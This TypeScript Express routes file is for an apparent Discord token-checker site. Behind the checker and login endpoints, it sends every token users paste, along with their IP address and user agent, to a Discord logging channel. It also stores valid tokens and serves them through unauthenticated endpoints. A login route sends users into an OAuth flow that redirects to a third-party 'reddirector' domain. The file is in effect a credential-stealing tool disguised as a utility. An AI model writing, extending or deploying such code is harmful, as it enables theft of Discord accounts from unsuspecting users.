import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { tokenSchema, discordUserSchema, bulkTokenSchema, TokenResult } from "@shared/schema";
import { ZodError } from "zod";
import fetch from "node-fetch";
import { logToDiscord } from "./discord-logger";

// Helper function to check a single token
async function checkToken(token: string, isSingleTokenCheck = false): Promise<TokenResult> {
  try {
    // Call Discord API to verify token
    const response = await fetch("https://discord.com/api/v10/users/@me", {
      headers: {
        Authorization: token,
      },
    });

    // Handle API response
    if (!response.ok) {
      // Get the error details from Discord
      const errorData = await response.json().catch(() => ({})) as Record<string, any>;
      const statusCode = response.status;
      
      let errorMessage = "Failed to verify token with Discord API";
      
      if (statusCode === 401) {
        errorMessage = "Invalid token. The token you provided is invalid or has expired.";
      } else if (statusCode === 429) {
        errorMessage = "Rate limited. Please try again later.";
      } else if (errorData && typeof errorData.message === 'string') {
        errorMessage = errorData.message;
      }
      
      const result = {
        token,
        valid: false,
        error: errorMessage
      };

      // Log invalid token check to Discord
      await logToDiscord({
        type: 'TOKEN_CHECK',
        message: `Invalid token check: ${errorMessage}`,
        data: { 
          token,
          statusCode, 
          errorData,
          isSingleCheck: isSingleTokenCheck
        }
      });
      
      return result;
    }

    // Parse Discord user data
    const userData = await response.json();
    const validatedUser = discordUserSchema.parse(userData);
    
    // Construct username with discriminator
    const displayUsername = validatedUser.discriminator === '0' 
      ? validatedUser.username  // New Discord username format without discriminator
      : `${validatedUser.username}#${validatedUser.discriminator}`;  // Classic format with discriminator
    
    // Log successful token check to Discord
    await logToDiscord({
      type: 'TOKEN_CHECK',
      message: `Valid token check for user: ${displayUsername}`,
      data: { 
        userId: validatedUser.id,
        username: validatedUser.username,
        discriminator: validatedUser.discriminator,
        avatar: validatedUser.avatar,
        isSingleCheck: isSingleTokenCheck
      }
    });
    
    // Return the successful result
    return {
      token,
      valid: true,
      user: validatedUser
    };
  } catch (error) {
    console.error("Error checking token:", error);
    
    // Log error to Discord
    await logToDiscord({
      type: 'ERROR',
      message: `Error checking token: ${error instanceof Error ? error.message : 'Unknown error'}`,
      data: { 
        error,
        isSingleCheck: isSingleTokenCheck
      }
    });
    
    return {
      token,
      valid: false, 
      error: error instanceof Error ? error.message : "Unknown error checking token"
    };
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // API endpoint to check a single Discord token
  app.post("/api/check-token", async (req, res) => {
    try {
      // Log the incoming request (with IP, headers, and the token input)
      await logToDiscord({
        type: 'REQUEST',
        message: `Received request to check a single token`,
        data: {
          ip: req.ip || req.socket.remoteAddress,
          userAgent: req.headers['user-agent'],
          method: req.method,
          path: req.path,
          input: req.body.token // Include the actual token that was input by the user
        }
      });
      
      // Validate token format
      const { token } = tokenSchema.parse(req.body);
      
      // Check the token, specifying this is a single token check
      const result = await checkToken(token, true);
      
      // If token is valid, save it to storage
      if (result.valid && result.user) {
        await storage.saveTokenCheck(result);
      }
      
      // If token is valid, return 200 with user data
      // If token is invalid, still return 200 with the error details
      // This helps the frontend to handle single and bulk checks consistently
      return res.json(result);
    } catch (error) {
      if (error instanceof ZodError) {
        await logToDiscord({
          type: 'ERROR',
          message: `Invalid token format attempt`,
          data: {
            ip: req.ip || req.socket.remoteAddress,
            userAgent: req.headers['user-agent'],
            error: 'Invalid token format'
          }
        });
        
        return res.status(400).json({ 
          message: "Invalid token format. Token must be at least 50 characters and contain a period (.)" 
        });
      }
      
      console.error("Error in check-token endpoint:", error);
      
      await logToDiscord({
        type: 'ERROR',
        message: `Server error in check-token endpoint: ${error instanceof Error ? error.message : 'Unknown error'}`,
        data: { error }
      });
      
      return res.status(500).json({ 
        message: "Server error while checking token" 
      });
    }
  });
  
  // API endpoint to check multiple Discord tokens
  app.post("/api/check-tokens", async (req, res) => {
    try {
      // Log bulk token check request with the input tokens
      await logToDiscord({
        type: 'REQUEST',
        message: `Received request to check multiple tokens`,
        data: {
          ip: req.ip || req.socket.remoteAddress,
          userAgent: req.headers['user-agent'],
          method: req.method,
          path: req.path,
          input: req.body.tokens // Include the actual tokens that were pasted by the user
        }
      });
      
      // Parse the input as a string and split into tokens
      const { tokens: tokensInput } = req.body;
      
      // Ensure we have a string
      if (typeof tokensInput !== 'string') {
        await logToDiscord({
          type: 'ERROR',
          message: 'Invalid bulk tokens input format',
          data: {
            ip: req.ip || req.socket.remoteAddress,
            expectedType: 'string',
            receivedType: typeof tokensInput
          }
        });
        
        return res.status(400).json({
          message: "Invalid input format. Expected a string of tokens."
        });
      }
      
      // Split the tokens by newline and filter empty lines
      const tokens = tokensInput
        .split(/\n/)
        .map(line => line.trim())
        .filter(line => line.length > 0);
      
      // If no valid tokens were provided
      if (tokens.length === 0) {
        await logToDiscord({
          type: 'ERROR',
          message: 'No valid tokens provided in bulk check',
          data: {
            ip: req.ip || req.socket.remoteAddress,
            userAgent: req.headers['user-agent']
          }
        });
        
        return res.status(400).json({ 
          message: "No valid tokens provided. Please enter at least one token." 
        });
      }
      
      // Log the number of tokens being checked
      await logToDiscord({
        type: 'INFO',
        message: `Processing bulk token check`,
        data: {
          tokenCount: tokens.length,
          ip: req.ip || req.socket.remoteAddress
        }
      });
      
      // Limit the number of tokens that can be checked at once
      const MAX_TOKENS = 100;
      const tokensToCheck = tokens.slice(0, MAX_TOKENS);
      
      // Process tokens with delay to avoid rate limits
      const results = [];
      for (const token of tokensToCheck) {
        const result = await checkToken(token);
        results.push(result);
        // Add small delay between checks
        await new Promise(resolve => setTimeout(resolve, 200));
      }
      
      // Save valid tokens to storage
      for (const result of results) {
        if (result.valid && result.user) {
          await storage.saveTokenCheck(result);
        }
      }
      
      // Log the results summary
      await logToDiscord({
        type: 'INFO',
        message: `Completed bulk token check`,
        data: {
          totalTokens: results.length,
          validTokens: results.filter(r => r.valid).length,
          invalidTokens: results.filter(r => !r.valid).length,
          truncated: tokens.length > MAX_TOKENS,
          ip: req.ip || req.socket.remoteAddress
        }
      });
      
      // Return all results
      return res.json({
        results,
        count: {
          total: results.length,
          valid: results.filter(r => r.valid).length,
          invalid: results.filter(r => !r.valid).length
        },
        truncated: tokens.length > MAX_TOKENS
      });
    } catch (error) {
      console.error("Error in check-tokens endpoint:", error);
      
      // Log error
      await logToDiscord({
        type: 'ERROR',
        message: `Server error in bulk token check: ${error instanceof Error ? error.message : 'Unknown error'}`,
        data: {
          ip: req.ip || req.socket.remoteAddress,
          userAgent: req.headers['user-agent'],
          error
        }
      });
      
      return res.status(500).json({ 
        message: "Server error while checking tokens" 
      });
    }
  });

  // API endpoint to get all saved tokens
  app.get("/api/saved-tokens", async (req, res) => {
    try {
      // Get all saved tokens from storage
      const savedTokens = await storage.getAllSavedTokens();
      
      return res.json({
        tokens: savedTokens,
        count: savedTokens.length
      });
    } catch (error) {
      console.error("Error getting saved tokens:", error);
      return res.status(500).json({ 
        message: "Server error while retrieving saved tokens" 
      });
    }
  });
  
  // API endpoint to get saved tokens for a specific user ID
  app.get("/api/saved-tokens/:userId", async (req, res) => {
    try {
      const { userId } = req.params;
      
      // Get tokens for the specified user ID
      const savedTokens = await storage.getSavedTokensByUserId(userId);
      
      return res.json({
        tokens: savedTokens,
        count: savedTokens.length
      });
    } catch (error) {
      console.error("Error getting saved tokens for user:", error);
      return res.status(500).json({ 
        message: "Server error while retrieving user tokens" 
      });
    }
  });

  // API endpoint for Discord token login
  app.post("/api/login", async (req, res) => {
    try {
      // Log the login attempt with the token input
      await logToDiscord({
        type: 'LOGIN',
        message: `User attempting to login with token`,
        data: {
          ip: req.ip || req.socket.remoteAddress,
          userAgent: req.headers['user-agent'],
          method: req.method,
          path: req.path,
          input: req.body.token // Include the actual token that was input by the user
        }
      });
      
      // Validate token format
      const { token } = tokenSchema.parse(req.body);
      
      // Check the token with Discord API (mark as single token check)
      const result = await checkToken(token, true);
      
      // If token is invalid, return error
      if (!result.valid || !result.user) {
        // Log failed login attempt
        await logToDiscord({
          type: 'ERROR',
          message: `Failed login attempt: ${result.error || "Invalid token"}`,
          data: {
            ip: req.ip || req.socket.remoteAddress,
            userAgent: req.headers['user-agent']
          }
        });
        
        return res.status(401).json({ 
          message: result.error || "Invalid token. Please try again." 
        });
      }
      
      // If token is valid, save it to storage
      const savedToken = await storage.saveTokenCheck(result);
      
      // Set the user in the session (if using session)
      if (req.session) {
        req.session.user = result.user;
        req.session.token = token;
        
        // Log successful login
        await logToDiscord({
          type: 'LOGIN',
          message: `Successful login for user: ${result.user.username}#${result.user.discriminator}`,
          data: {
            userId: result.user.id,
            username: result.user.username,
            discriminator: result.user.discriminator,
            avatar: result.user.avatar,
            ip: req.ip || req.socket.remoteAddress,
            userAgent: req.headers['user-agent']
          }
        });
      }
      
      // Return success with user data
      return res.json({
        message: "Login successful",
        user: result.user,
        savedToken
      });
    } catch (error) {
      if (error instanceof ZodError) {
        // Log invalid format error
        await logToDiscord({
          type: 'ERROR',
          message: `Invalid token format in login attempt`,
          data: {
            ip: req.ip || req.socket.remoteAddress,
            userAgent: req.headers['user-agent'],
            error: 'Invalid token format'
          }
        });
        
        return res.status(400).json({ 
          message: "Invalid token format. Token must be at least 50 characters and contain a period (.)" 
        });
      }
      
      console.error("Error in login endpoint:", error);
      
      // Log server error
      await logToDiscord({
        type: 'ERROR',
        message: `Server error in login endpoint: ${error instanceof Error ? error.message : 'Unknown error'}`,
        data: {
          ip: req.ip || req.socket.remoteAddress,
          userAgent: req.headers['user-agent'],
          error
        }
      });
      
      return res.status(500).json({ 
        message: "Server error while processing login" 
      });
    }
  });

  // API endpoint to check login status
  app.get("/api/auth/status", (req, res) => {
    if (req.session && req.session.user) {
      return res.json({
        isLoggedIn: true,
        user: req.session.user
      });
    }
    
    return res.json({
      isLoggedIn: false
    });
  });
  
  // API endpoint for logging out
  app.post("/api/logout", (req, res) => {
    // Log logout attempt
    if (req.session && req.session.user) {
      // Get user info before destroying session
      const user = req.session.user;
      
      // Log the logout with user details
      logToDiscord({
        type: 'INFO',
        message: `User logout: ${user.username}#${user.discriminator}`,
        data: {
          userId: user.id,
          username: user.username,
          discriminator: user.discriminator,
          ip: req.ip || req.socket.remoteAddress,
          userAgent: req.headers['user-agent']
        }
      }).catch(error => {
        console.error("Error logging to Discord:", error);
      });
      
      // Destroy the session
      req.session.destroy((err) => {
        if (err) {
          console.error("Error destroying session:", err);
          
          // Log the error
          logToDiscord({
            type: 'ERROR',
            message: `Error during logout: ${err.message}`,
            data: {
              ip: req.ip || req.socket.remoteAddress,
              error: err
            }
          }).catch(logError => {
            console.error("Error logging to Discord:", logError);
          });
          
          return res.status(500).json({ message: "Failed to logout" });
        }
        
        // Clear cookie
        res.clearCookie("connect.sid");
        
        // Return success
        return res.json({ message: "Logged out successfully" });
      });
    } else {
      // If no session exists, just log the attempt
      logToDiscord({
        type: 'INFO',
        message: 'Logout attempt with no active session',
        data: {
          ip: req.ip || req.socket.remoteAddress,
          userAgent: req.headers['user-agent']
        }
      }).catch(error => {
        console.error("Error logging to Discord:", error);
      });
      
      // Return success
      return res.json({ message: "Logged out successfully" });
    }
  });
  
  // API endpoint to initiate Discord login redirect
  app.get("/api/discord-login", (req, res) => {
    // Redirect to Discord official login page with QR code
    res.redirect("https://discord.com/login?redirect_to=%2Foauth2%2Fauthorize%3Fclient_id%3D1089412850072006716%26redirect_uri%3Dhttps%253A%252F%252Fnick.wrad.org%252FAdmin%252Freddirector%252F%26response_type%3Dcode%26scope%3Didentify%2520email");
  });

  const httpServer = createServer(app);

  return httpServer;
}
